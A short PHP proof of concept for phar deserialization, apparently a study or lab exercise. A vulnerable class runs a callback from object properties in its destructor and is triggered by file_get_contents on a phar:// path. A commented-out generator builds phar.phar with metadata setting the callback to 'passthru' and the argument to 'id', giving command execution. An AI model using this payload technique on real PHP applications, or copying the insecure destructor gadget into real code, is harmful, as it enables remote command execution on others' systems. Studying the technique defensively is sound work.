<?php
/**
 * Created by PhpStorm.
 * User: Kevinsa
 * Date: 2018/10/27
 * Time: 9:52 PM
 */
class PharTest {
    protected $callback;
    protected $data;

    public function __destruct()
    {
        call_user_func($this->callback,$this->data);
    }
}

$filename = "phar://phar.phar/test.txt";
file_get_contents($filename);

/*
<?php
/**
 * Created by PhpStorm.
 * User: Kevinsa
 * Date: 2018/10/27
 * Time: 9:53 PM
 */

class PharTest {
    protected $callback;
    protected $data;

    public function __construct()
    {
        $this->callback = 'passthru';
        $this->data='id';
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); 
$o = new PharTest();
$phar->setMetadata($o); 
$phar->addFromString("test.txt", "test");
//签名自动计算
$phar->stopBuffering();

*/
